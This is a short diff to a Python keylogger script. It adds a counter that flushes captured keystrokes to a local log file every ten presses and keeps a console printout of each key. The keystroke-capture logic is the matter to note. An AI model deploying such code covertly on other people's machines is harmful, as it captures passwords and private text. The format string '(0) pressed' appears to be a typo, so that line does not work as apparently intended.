@@ -9,14 +9,17 @@ keys = []
 #function to record when a key is pressed
 def on_press(key):
     global keys, count
-
+    # appending the keystrokes to the key list
     keys.append(key)
     count += 1
     #log into console what keys are pressed
     print("(0) pressed".format(key))
-
-
-
+#setting a "timer" so that when more than 10 keys are pressed it will write
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+#function to write append to a log file the keystrokes
 def write_file(keys):
     with open("log.txt", "a") as f:
         for key in keys:
